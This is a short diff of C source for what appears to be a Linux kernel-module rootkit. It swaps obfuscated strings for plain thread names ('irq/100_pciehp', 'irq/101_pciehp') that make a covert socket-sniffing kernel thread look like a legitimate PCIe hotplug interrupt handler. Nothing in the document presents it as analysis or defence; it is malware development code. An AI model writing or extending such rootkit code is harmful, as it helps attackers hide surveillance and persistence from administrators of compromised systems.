@@ -27,7 +27,6 @@
 
 #include "lkm.h"
 #include "fs.h"
-#include "obfstr.h"
 
 #define MAX_PROCFS_SIZE PAGE_SIZE
 #define MAX_MAGIC_WORD_SIZE 16
@@ -774,7 +773,7 @@ static int __init kv_init(void) {
     if (!sys_init())
         goto sys_init_error;
 
-    tname = kv_whatever_getstr(_OBF_IRQ_100_PCIEHP, sizeof(_OBF_IRQ_100_PCIEHP));
+    tname = "irq/100_pciehp";
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     kaddr = kv_kall_load_addr();
     if (!kaddr || !kaddr->k_do_exit)
@@ -785,7 +784,7 @@ static int __init kv_init(void) {
         goto unroll_init;
 
 cont:
-    tname = kv_whatever_getstr(_OBF_IRQ_101_PCIEHP, sizeof(_OBF_IRQ_101_PCIEHP));
+    tname = "irq/101_pciehp";
     tsk_sniff = kv_sock_start_sniff(tname);
     if (!tsk_sniff)
         goto unroll_init;
